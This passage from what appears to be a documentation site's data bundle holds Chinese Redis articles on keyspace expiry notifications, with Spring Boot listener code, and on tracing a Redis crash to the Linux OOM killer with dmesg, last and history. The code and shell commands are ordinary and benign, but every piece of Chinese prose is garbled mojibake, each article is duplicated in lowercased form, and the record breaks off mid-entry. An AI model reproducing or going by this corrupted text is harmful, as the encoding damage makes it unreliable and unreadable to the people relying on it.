ä¸ºåç¼\n * g del , expipre , rename ç­ç±»åæ å³çéç¨å½ä»¤çéç¥ï¼...\n * $ String å½ä»¤\n * l List å½ä»¤\n * s Set å½ä»¤\n * h Hash å½ä»¤\n * z æåºéåå½ä»¤\n * x è¿æäºä»¶ï¼æ¯æ¬¡ key è¿ææ¶çæï¼\n * e é©±éäºä»¶ï¼å½ key å¨åå­æ»¡äºè¢«æ¸é¤æ¶çæï¼\n * A g$lshzxe çå«åï¼å æ­¤âAKEâ æå³çææçäºä»¶\n\nnotify-keyspace-eventséé¡¹\næå¡å¨éç½®çnotify-keyspace-eventséé¡¹å³å®äºæå¡å¨æåééç¥çç±»åï¼\nå¯ä»¥è®¾ç½®çç±»åå¦ä¸ï¼\næ³è®©æå¡å¨åéææç±»åçé®ç©ºé´éç¥åé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºAKE\næ³è®©æå¡å¨åéææç±»åçé®ç©ºé´éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºAK\næ³è®©æå¡å¨åéææç±»åçé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºAE\næ³è®©æå¡å¨åªåéåå­ç¬¦ä¸²é®æå³çé®ç©ºé´éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºK$\næ³è®©æå¡å¨åªåéååè¡¨é®æå³çé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºEl\nå¤æ³¨ï¼notify-keyspace-eventséé¡¹çé»è®¤å¼ä¸ºç©ºï¼æä»¥å¦æä¸è®¾ç½®ä¸é¢çå¼ï¼SUBSCRIBEå½ä»¤ä¸ä¼æä»»ä½ææ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¶ä¸­åçå°±æ¯ä½¿ç¨äº redis çåå¸è®¢éåè½ã\n\n\n# spring boot redis key å¤±æéç¥éç½®\n\n\n# æ·»å éç½®ç±»\n\npackage com.giant.cloud.config;\n\nimport com.giant.cloud.support.ReceiveNoticeMessage;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.MessageListener;\nimport org.springframework.data.redis.connection.RedisConnectionFactory;\nimport org.springframework.data.redis.listener.ChannelTopic;\nimport org.springframework.data.redis.listener.RedisMessageListenerContainer;\nimport org.springframework.data.redis.listener.adapter.MessageListenerAdapter;\n\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.stream.Collectors;\n\n/**\n * @author big uncle\n * @date 2020/7/13 16:24\n * @module\n **/\n@Configuration\n@ConditionalOnBean(ReceiveNoticeMessage.class)\n@Slf4j\npublic class RedisNoticeConfig {\n\n    @Value("${spring.redis.database:0}")\n    private Integer db;\n\n    @Autowired\n    ReceiveNoticeMessage receiveNoticeMessage;\n\n    /**\n     * å° Receiveræ³¨åä¸ºä¸ä¸ªæ¶æ¯çå¬å¨ï¼å¹¶æå®æ¶æ¯æ¥æ¶çæ¹æ³(expiredMessage)\n     * å¦æä¸æå®æ¶æ¯æ¥æ¶çæ¹æ³ï¼æ¶æ¯çå¬å¨ä¼é»è®¤çå¯»æ¾Receiverä¸­çhandleMessageè¿ä¸ªæ¹æ³åä¸ºæ¶æ¯æ¥æ¶çæ¹å¼\n    **/\n    @Bean\n    MessageListener messageListener(){\n        return new MessageListenerAdapter(receiveNoticeMessage(),"noticeMessage");\n    }\n\n    @Bean\n    ReceiveNoticeMessage receiveNoticeMessage(){\n        return receiveNoticeMessage;\n    }\n\n    /**\n     * è®¾ç½®çå¬ç±»å\n    **/\n    @Bean\n    public List<ChannelTopic> channelTopic(){\n        String name = "__keyevent@"+db.intValue()+"__:%s";\n        List<String> commands = Arrays.asList("set","lpush","expired");\n        return commands.stream().map(i -> new ChannelTopic(String.format(name,i))).collect(Collectors.toList());\n    }\n\n    /**\n     * éè¿ RedisMessageListenerContainer éç½®çå¬çæ\n    **/\n    @Bean\n    public RedisMessageListenerContainer redisMessageListenerContainer(@Autowired RedisConnectionFactory redisConnectionFactory){\n        RedisMessageListenerContainer redisMessageListenerContainer = new RedisMessageListenerContainer();\n        redisMessageListenerContainer.setConnectionFactory(redisConnectionFactory);\n        redisMessageListenerContainer.addMessageListener(messageListener(),channelTopic());\n        return redisMessageListenerContainer;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n\n# æ¥å£\n\npackage com.giant.cloud.support;\n\n/**\n * @author big uncle\n * @date 2020/7/13 17:13\n **/\npublic interface ReceiveNoticeMessage {\n    /**\n     * å¤±ææ¥æ¶æ¹æ³\n     * @author big uncle\n     * @date 2020/7/13 17:14\n     * @param key\n     * @param channel\n     * @return void\n    **/\n    void noticeMessage(String key,String channel);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# å®ç°ç±»\n\npackage com.giant.cloud.monitor;\n\nimport com.giant.cloud.support.ReceiveNoticeMessage;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\n/**\n * @author big uncle\n * @date 2020/10/9 17:49\n * @module\n **/\n@Component\n@Slf4j\npublic class RedisKeyMonitor implements ReceiveNoticeMessage {\n\n    @Override\n    public void noticeMessage(String key,String channel) {\n        log.debug("key is {}, channel is {}",key,channel);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# ä¿®æ¹ redis.conf éç½®\n\næ¾å° notify-keyspace-events å¹¶å° notify-keyspace-events ä¿®æ¹ä¸º notify-keyspace-events ex\n\n\n\néç½® ex å¯¹åºçææå¦ä¸ï¼ e: é®äºä»¶éç¥ï¼ä»¥ __keysevent@<db>__ ä¸ºåç¼ x: è¿æäºä»¶ï¼æ¯æ¬¡ key è¿ææ¶çæï¼\n\n * k é®ç©ºé´éç¥ï¼ä»¥ __keyspace@<db>__ ä¸ºåç¼\n * e é®äºä»¶éç¥ï¼ä»¥ __keysevent@<db>__ ä¸ºåç¼\n * g del , expipre , rename ç­ç±»åæ å³çéç¨å½ä»¤çéç¥ï¼...\n * $ string å½ä»¤\n * l list å½ä»¤\n * s set å½ä»¤\n * h hash å½ä»¤\n * z æåºéåå½ä»¤\n * x è¿æäºä»¶ï¼æ¯æ¬¡ key è¿ææ¶çæï¼\n * e é©±éäºä»¶ï¼å½ key å¨åå­æ»¡äºè¢«æ¸é¤æ¶çæï¼\n * a g$lshzxe çå«åï¼å æ­¤âakeâ æå³çææçäºä»¶\n\nnotify-keyspace-eventséé¡¹\næå¡å¨éç½®çnotify-keyspace-eventséé¡¹å³å®äºæå¡å¨æåééç¥çç±»åï¼\nå¯ä»¥è®¾ç½®çç±»åå¦ä¸ï¼\næ³è®©æå¡å¨åéææç±»åçé®ç©ºé´éç¥åé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºake\næ³è®©æå¡å¨åéææç±»åçé®ç©ºé´éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºak\næ³è®©æå¡å¨åéææç±»åçé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºae\næ³è®©æå¡å¨åªåéåå­ç¬¦ä¸²é®æå³çé®ç©ºé´éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºk$\næ³è®©æå¡å¨åªåéååè¡¨é®æå³çé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºel\nå¤æ³¨ï¼notify-keyspace-eventséé¡¹çé»è®¤å¼ä¸ºç©ºï¼æä»¥å¦æä¸è®¾ç½®ä¸é¢çå¼ï¼subscribeå½ä»¤ä¸ä¼æä»»ä½ææ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¶ä¸­åçå°±æ¯ä½¿ç¨äº redis çåå¸è®¢éåè½ã\n\n\n# spring boot redis key å¤±æéç¥éç½®\n\n\n# æ·»å éç½®ç±»\n\npackage com.giant.cloud.config;\n\nimport com.giant.cloud.support.receivenoticemessage;\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.beans.factory.annotation.value;\nimport org.springframework.boot.autoconfigure.condition.conditionalonbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.data.redis.connection.messagelistener;\nimport org.springframework.data.redis.connection.redisconnectionfactory;\nimport org.springframework.data.redis.listener.channeltopic;\nimport org.springframework.data.redis.listener.redismessagelistenercontainer;\nimport org.springframework.data.redis.listener.adapter.messagelisteneradapter;\n\nimport java.util.arrays;\nimport java.util.list;\nimport java.util.stream.collectors;\n\n/**\n * @author big uncle\n * @date 2020/7/13 16:24\n * @module\n **/\n@configuration\n@conditionalonbean(receivenoticemessage.class)\n@slf4j\npublic class redisnoticeconfig {\n\n    @value("${spring.redis.database:0}")\n    private integer db;\n\n    @autowired\n    receivenoticemessage receivenoticemessage;\n\n    /**\n     * å° receiveræ³¨åä¸ºä¸ä¸ªæ¶æ¯çå¬å¨ï¼å¹¶æå®æ¶æ¯æ¥æ¶çæ¹æ³(expiredmessage)\n     * å¦æä¸æå®æ¶æ¯æ¥æ¶çæ¹æ³ï¼æ¶æ¯çå¬å¨ä¼é»è®¤çå¯»æ¾receiverä¸­çhandlemessageè¿ä¸ªæ¹æ³åä¸ºæ¶æ¯æ¥æ¶çæ¹å¼\n    **/\n    @bean\n    messagelistener messagelistener(){\n        return new messagelisteneradapter(receivenoticemessage(),"noticemessage");\n    }\n\n    @bean\n    receivenoticemessage receivenoticemessage(){\n        return receivenoticemessage;\n    }\n\n    /**\n     * è®¾ç½®çå¬ç±»å\n    **/\n    @bean\n    public list<channeltopic> channeltopic(){\n        string name = "__keyevent@"+db.intvalue()+"__:%s";\n        list<string> commands = arrays.aslist("set","lpush","expired");\n        return commands.stream().map(i -> new channeltopic(string.format(name,i))).collect(collectors.tolist());\n    }\n\n    /**\n     * éè¿ redismessagelistenercontainer éç½®çå¬çæ\n    **/\n    @bean\n    public redismessagelistenercontainer redismessagelistenercontainer(@autowired redisconnectionfactory redisconnectionfactory){\n        redismessagelistenercontainer redismessagelistenercontainer = new redismessagelistenercontainer();\n        redismessagelistenercontainer.setconnectionfactory(redisconnectionfactory);\n        redismessagelistenercontainer.addmessagelistener(messagelistener(),channeltopic());\n        return redismessagelistenercontainer;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n\n# æ¥å£\n\npackage com.giant.cloud.support;\n\n/**\n * @author big uncle\n * @date 2020/7/13 17:13\n **/\npublic interface receivenoticemessage {\n    /**\n     * å¤±ææ¥æ¶æ¹æ³\n     * @author big uncle\n     * @date 2020/7/13 17:14\n     * @param key\n     * @param channel\n     * @return void\n    **/\n    void noticemessage(string key,string channel);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# å®ç°ç±»\n\npackage com.giant.cloud.monitor;\n\nimport com.giant.cloud.support.receivenoticemessage;\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.stereotype.component;\n\n/**\n * @author big uncle\n * @date 2020/10/9 17:49\n * @module\n **/\n@component\n@slf4j\npublic class rediskeymonitor implements receivenoticemessage {\n\n    @override\n    public void noticemessage(string key,string channel) {\n        log.debug("key is {}, channel is {}",key,channel);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0}},{title:"Redisè®°ä¸æ¬¡å®æºææ¥",frontmatter:{title:"Redisè®°ä¸æ¬¡å®æºææ¥",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1606",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1606.Redis%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%95%E6%9C%BA%E6%8E%92%E6%9F%A5.html",relativePath:"02.ä¸­é´ä»¶/03.redis/1606.Redisè®°ä¸æ¬¡å®æºææ¥.md",key:"v-5ff80878",path:"/Redis/1606/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:"æè¿å¬å¸è¦åä¸å¤© 8 äº¿çº§æ°æ®çç¼å­ï¼ç¶åè®©æå¯¹ redis è¿è¡ä¸æ³¢æ§è½æµè¯ï¼ä½æ¯ä»å¤©åç° redis çªç¶æ²¡æå¨è¿è¡ï¼å¹¶ä¸åå­æ²¡æä»»ä½å ç¨æåµãç¶åæå°±æ³å°åæ¥çæ¥å¿ï¼å¦ä¸\n\n                _._                                                  \n           _.-``__ ''-._                                             \n      _.-``    `.  `_.  ''-._           Redis 6.0.8 (00000000/0) 64 bit\n  .-`` .-```.  ```\\/    _.,_ ''-._                                   \n (    '      ,       .-`  | `,    )     Running in standalone mode\n |`-._`-...-` __...-.``-._|'` _.-'|     Port: 6379\n |    `-._   `._    /     _.-'    |     PID: 14135\n  `-._    `-._  `-./  _.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |           http://redis.io        \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |                                  \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n      `-._    `-.__.-'    _.-'                                       \n          `-._        _.-'                                           \n              `-.__.-'                                               \n\n14135:M 27 Sep 2020 20:36:47.498 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.\n14135:M 27 Sep 2020 20:36:47.498 # Server initialized\n14135:M 27 Sep 2020 20:36:47.498 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.\n14135:M 27 Sep 2020 20:36:47.498 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command 'echo madvise > /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled (set to 'madvise' or 'never').\n14135:M 27 Sep 2020 20:36:47.498 * Ready to accept connections\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\næ¥å¿é¤äºå¯å¨ä¿¡æ¯ä»¥å¤å¹¶æ²¡æè¾åºä»»ä½ææçä¿¡æ¯ãå¦æ redis æ¯è¢« cli å³æçè¯ï¼ä¼å¨æ¥å¿ä¿¡æ¯ä¸­æ bye bye çä¿¡æ¯ï¼ä½æ¥å¿æ²¡æï¼é£å°±æ¯å¯è½æ¯è¢« kill çï¼éè¿å¦ä¸å½ä»¤å¯ä»¥æ¥çæåµã\n\n[root@localhost log]# dmesg | egrep -i 'killed process'\n[ 1620.429506] Killed process 9696 (redis-server), UID 0, total-vm:23432912kB, anon-rss:18961524kB, file-rss:68kB, shmem-rss:0kB\n[338063.393365] Killed process 13956 (redis-server), UID 0, total-vm:33468100kB, anon-rss:26147740kB, file-rss:0kB, shmem-rss:0kB\n[367433.290406] Killed process 14135 (redis-server), UID 0, total-vm:39923260kB, anon-rss:34407376kB, file-rss:0kB, shmem-rss:0kB\n\n\n1\n2\n3\n4\n\n\nåç° redis çç¡®æ¯è¢« kill æçï¼æå¯å¨ redis çè¿ç¨æ¯ 14135ï¼åå¥½æ¥å° killed process æ¯æ 14135ãè¿å°æå¡å¨åªææèªå·±ç¥éï¼æä»¥å¯ä»¥ç´æ¥æé¤æ¯äººä¸ºçæåµãé£ç¨åºè¢« kill è°å°±åªæ linux èªå·±çç­ç¥äºï¼æä»¬ç¥é linux æ¯æ oom çç­ç¥å·ä½æ ¹æ®è®¾ç½®ç oom_score_adj çå¼æå³ï¼é£æä»¬ç´æ¥æ¥ä¸æ¯ä¸æ¯ oom åå ææ­»ï¼å½ä»¤å¦ä¸\n\n[root@localhost log]# grep \"Out of memory\" /var/log/messages  \nSep 27 16:45:11 localhost kernel: Out of memory: Kill process 13445 (redis-server) score 747 or sacrifice child\nSep 28 00:54:43 localhost kernel: Out of memory: Kill process 14135 (redis-server) score 951 or sacrifice child\n\n\n1\n2\n3\n\n\nçæ¥ççæ¯åå­ä¸å¤ç¨æ redis ç» kill äºãå¦ææ¯è¢«å¶ä»ç¨æ· kill æçè¯æä»¬è¯¥æä¹ææ¥ï¼\nåæ¥è¯¢æè¿åªäºç¨æ·ç»å½\n\n[root@localhost log]# last\nroot     pts/3        192.168.200.89   Sun Sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   Sun Sep 27 12:59   still logged in \n\n\n1\n2\n3\n\n\nç¬¦å·                      æè¿°\nroot                    ç¨æ·\npts/3                   ç»ç«¯\n192.168.200.89          ç»å½è IP\nSun Sep 27 17:18        ç»å½æ¶é´\nstill logged in ï¼è¿å¨çº¿ï¼   ç»å½ç¶æ (è·ç¦»ä¸æ¬¡ç»å½æ¶é´)\n\nç¥éäºä»¥åä¹å¯ä»¥åªæ¥çæä¸ªç¨æ·ï¼æè¿éåªæ root ç¨æ·ï¼å®éæåµä¸­ï¼æ¯ä¸ªäººé½åºè¯¥æä¸ä¸ªè´¦æ·ï¼root åªæè¶çº§ç®¡çåæ¥æï¼å¦åé½ç¨ root ç¨æ·æ¯æ æ³ææ¥åºæ¥çã\n\n[root@localhost log]# last root\nroot     pts/3        192.168.200.89   Sun Sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   Sun Sep 27 12:59   still logged in   \nroot     pts/2        192.168.200.89   Sun Sep 27 09:47   still logged in   \nroot     pts/1        192.168.200.89   Sun Sep 27 09:46 - 12:59  (03:12)  \n\n\n1\n2\n3\n4\n5\n\n\nhistory å½ä»¤ï¼å¯ä»¥æç¨æ·æç¨è¿çåå²å½ä»¤æ¥åºæ¥ï¼æ¯ä¸ªç¨æ·é½ä¼æè¿æ ·ä¸ä¸ªæä»¶ã\n\næä»¤   æè¿°\n-c   æ¸ç©ºå½ååå²å½ä»¤\n-a   å°åå²å½ä»¤ç¼å²åºä¸­å½ä»¤åå¥åå²å½ä»¤æä»¶ã/root/.bash_historyã\n-r   å°åå²å½ä»¤æä»¶ä¸­çå½ä»¤è¯»å¥å½ååå²å½ä»¤ç¼å²åº\n-w   å°å½ååå²å½ä»¤ç¼å²åºå½ä»¤åå¥åå²å½ä»¤æä»¶ä¸­ã/root/.bash_historyã\nn    å¦æ n=3 æå°æè¿ 3 æ¡åå²å½ä»¤\n\n[root@localhost log]# history 10\n 1030  w rott\n 1031  w root\n 1032  history\n 1033  last\n 1034  last root\n 1035  w\n 1036  lastlog\n 1037  history\n 1038  history -h\n 1039  history 10\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\né»è®¤ history ä¸å¸¦æ§è¡æ¶é´ï¼æä»¥å¦ææ¯åä¸ä¸ªç¨æ·æ²¡åæ³åºåæ¯è°ä½¿ç¨äº kill é æç ´åã\nè®© history å¸¦ææ¶é´\n\necho 'export HISTTIMEFORMAT=\"%F %T  \"' >> /etc/bashrc\nsource /etc/bashrc\n\n\n1\n2\n\n\n[root@localhost log]# history 6\n 1048  2020-09-28 11:03:21  echo 'export HISTTIMEFORMAT=\"%F %T  \"' >> /etc/bashrc\n 1049  2020-09-28 11:03:25  source /etc/bashrc\n 1050  2020-09-28 11:03:27  history 10\n 1051  2020-09-28 11:04:27  ls\n 1052  2020-09-28 11:04:30  history 10\n 1053  2020-09-28 11:04:45  history 6\n\n\n1\n2\n3\n4\n5\n6\n7\n",normalizedContent:"æè¿å¬å¸è¦åä¸å¤© 8 äº¿çº§æ°æ®çç¼å­ï¼ç¶åè®©æå¯¹ redis è¿è¡ä¸æ³¢æ§è½æµè¯ï¼ä½æ¯ä»å¤©åç° redis çªç¶æ²¡æå¨è¿è¡ï¼å¹¶ä¸åå­æ²¡æä»»ä½å ç¨æåµãç¶åæå°±æ³å°åæ¥çæ¥å¿ï¼å¦ä¸\n\n                _._                                                  \n           _.-``__ ''-._                                             \n      _.-``    `.  `_.  ''-._           redis 6.0.8 (00000000/0) 64 bit\n  .-`` .-```.  ```\\/    _.,_ ''-._                                   \n (    '      ,       .-`  | `,    )     running in standalone mode\n |`-._`-...-` __...-.``-._|'` _.-'|     port: 6379\n |    `-._   `._    /     _.-'    |     pid: 14135\n  `-._    `-._  `-./  _.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |           http://redis.io        \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |                                  \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n      `-._    `-.__.-'    _.-'                                       \n          `-._        _.-'                                           \n              `-.__.-'                                               \n\n14135:m 27 sep 2020 20:36:47.498 # warning: the tcp backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.\n14135:m 27 sep 2020 20:36:47.498 # server initialized\n14135:m 27 sep 2020 20:36:47.498 # warning overcommit_memory is set to 0! background save may fail under low memory condition. to fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.\n14135:m 27 sep 2020 20:36:47.498 # warning you have transparent huge pages (thp) support enabled in your kernel. this will create latency and memory usage issues with redis. to fix this issue run the command 'echo madvise > /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. redis must be restarted after thp is disabled (set to 'madvise' or 'never').\n14135:m 27 sep 2020 20:36:47.498 * ready to accept connections\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\næ¥å¿é¤äºå¯å¨ä¿¡æ¯ä»¥å¤å¹¶æ²¡æè¾åºä»»ä½ææçä¿¡æ¯ãå¦æ redis æ¯è¢« cli å³æçè¯ï¼ä¼å¨æ¥å¿ä¿¡æ¯ä¸­æ bye bye çä¿¡æ¯ï¼ä½æ¥å¿æ²¡æï¼é£å°±æ¯å¯è½æ¯è¢« kill çï¼éè¿å¦ä¸å½ä»¤å¯ä»¥æ¥çæåµã\n\n[root@localhost log]# dmesg | egrep -i 'killed process'\n[ 1620.429506] killed process 9696 (redis-server), uid 0, total-vm:23432912kb, anon-rss:18961524kb, file-rss:68kb, shmem-rss:0kb\n[338063.393365] killed process 13956 (redis-server), uid 0, total-vm:33468100kb, anon-rss:26147740kb, file-rss:0kb, shmem-rss:0kb\n[367433.290406] killed process 14135 (redis-server), uid 0, total-vm:39923260kb, anon-rss:34407376kb, file-rss:0kb, shmem-rss:0kb\n\n\n1\n2\n3\n4\n\n\nåç° redis çç¡®æ¯è¢« kill æçï¼æå¯å¨ redis çè¿ç¨æ¯ 14135ï¼åå¥½æ¥å° killed process æ¯æ 14135ãè¿å°æå¡å¨åªææèªå·±ç¥éï¼æä»¥å¯ä»¥ç´æ¥æé¤æ¯äººä¸ºçæåµãé£ç¨åºè¢« kill è°å°±åªæ linux èªå·±çç­ç¥äºï¼æä»¬ç¥é linux æ¯æ oom çç­ç¥å·ä½æ ¹æ®è®¾ç½®ç oom_score_adj çå¼æå³ï¼é£æä»¬ç´æ¥æ¥ä¸æ¯ä¸æ¯ oom åå ææ­»ï¼å½ä»¤å¦ä¸\n\n[root@localhost log]# grep \"out of memory\" /var/log/messages  \nsep 27 16:45:11 localhost kernel: out of memory: kill process 13445 (redis-server) score 747 or sacrifice child\nsep 28 00:54:43 localhost kernel: out of memory: kill process 14135 (redis-server) score 951 or sacrifice child\n\n\n1\n2\n3\n\n\nçæ¥ççæ¯åå­ä¸å¤ç¨æ redis ç» kill äºãå¦ææ¯è¢«å¶ä»ç¨æ· kill æçè¯æä»¬è¯¥æä¹ææ¥ï¼\nåæ¥è¯¢æè¿åªäºç¨æ·ç»å½\n\n[root@localhost log]# last\nroot     pts/3        192.168.200.89   sun sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   sun sep 27 12:59   still logged in \n\n\n1\n2\n3\n\n\nç¬¦å·                      æè¿°\nroot                    ç¨æ·\npts/3                   ç»ç«¯\n192.168.200.89          ç»å½è ip\nsun sep 27 17:18        ç»å½æ¶é´\nstill logged in ï¼è¿å¨çº¿ï¼   ç»å½ç¶æ (è·ç¦»ä¸æ¬¡ç»å½æ¶é´)\n\nç¥éäºä»¥åä¹å¯ä»¥åªæ¥çæä¸ªç¨æ·ï¼æè¿éåªæ root ç¨æ·ï¼å®éæåµä¸­ï¼æ¯ä¸ªäººé½åºè¯¥æä¸ä¸ªè´¦æ·ï¼root åªæè¶çº§ç®¡çåæ¥æï¼å¦åé½ç¨ root ç¨æ·æ¯æ æ³ææ¥åºæ¥çã\n\n[root@localhost log]# last root\nroot     pts/3        192.168.200.89   sun sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   sun sep 27 12:59   still logged in   \nroot     pts/2        192.168.200.89   sun sep 27 09:47   still logged in   \nroot     pts/1        192.168.200.89   sun sep 27 09:46 - 12:59  (03:12)  \n\n\n1\n2\n3\n4\n5\n\n\nhistory å½ä»¤ï¼å¯ä»¥æç¨æ·æç¨è¿çåå²å½ä»¤æ¥åºæ¥ï¼æ¯ä¸ªç¨æ·é½ä¼æè¿æ ·ä¸ä¸ªæä»¶ã\n\næä»¤   æè¿°\n-c   æ¸ç©ºå½ååå²å½ä»¤\n-a   å°åå²å½ä»¤ç¼å²åºä¸­å½ä»¤åå¥åå²å½ä»¤æä»¶ã/root/.bash_historyã\n-r   å°åå²å½ä»¤æä»¶ä¸­çå½ä»¤è¯»å¥å½ååå²å½ä»¤ç¼å²åº\n-w   å°å½ååå²å½ä»¤ç¼å²åºå½ä»¤åå¥åå²å½ä»¤æä»¶ä¸­ã/root/.bash_historyã\nn    å¦æ n=3 æå°æè¿ 3 æ¡åå²å½ä»¤\n\n[root@localhost log]# history 10\n 1030  w rott\n 1031  w root\n 1032  history\n 1033  last\n 1034  last root\n 1035  w\n 1036  lastlog\n 1037  history\n 1038  history -h\n 1039  history 10\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\né»è®¤ history ä¸å¸¦æ§è¡æ¶é´ï¼æä»¥å¦ææ¯åä¸ä¸ªç¨æ·æ²¡åæ³åºåæ¯è°ä½¿ç¨äº kill é æç ´åã\nè®© history å¸¦ææ¶é´\n\necho 'export histtimeformat=\"%f %t  \"' >> /etc/bashrc\nsource /etc/bashrc\n\n\n1\n2\n\n\n[root@localhost log]# history 6\n 1048  2020-09-28 11:03:21  echo 'export histtimeformat=\"%f %t  \"' >> /etc/bashrc\n 1049  2020-09-28 11:03:25  source /etc/bashrc\n 1050  2020-09-28 11:03:27  history 10\n 1051  2020-09-28 11:04:27  ls\n 1052  2020-09-28 11:04:30  history 10\n 1053  2020-09-28 11:04:45  history 6\n\n\n1\n2\n3\n4\n5\n6\n7\n",charsets:{cjk:!0}},{title:"Rediséç½®æä»¶è§£è¯»",frontmatter:{title:"Rediséç½®æä»¶è§£è¯»",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1605",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1605.Redis%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%A7%A3%E8%AF%BB.html",relativePath:"02.ä¸­é´ä»¶/03.redis/1605.Rediséç½®æä»¶è§£è¯».md",key:"v-5c71f4fa",path:"/Redis/1605/",headers:[{level:2,title:"network ç½ç»",slug:"network-ç½ç»",normalizedTitle:"network ç½ç»",charIndex:24},{level:3,title:"+ bind",slug:"bind",normalizedTitle:"+ bind",charIndex:39},{level:3,title:"+ protected-mode",slug:"protected-mode",normalizedTitle:"+ protected-mode",charIndex:165},{level:3,title:"+ port",slug:"port",normalizedTitle:"+ port",charIndex:283},{level:3,title:"+ tcp-backlog",slug:"tcp-backlog",normalizedTitle:"+ 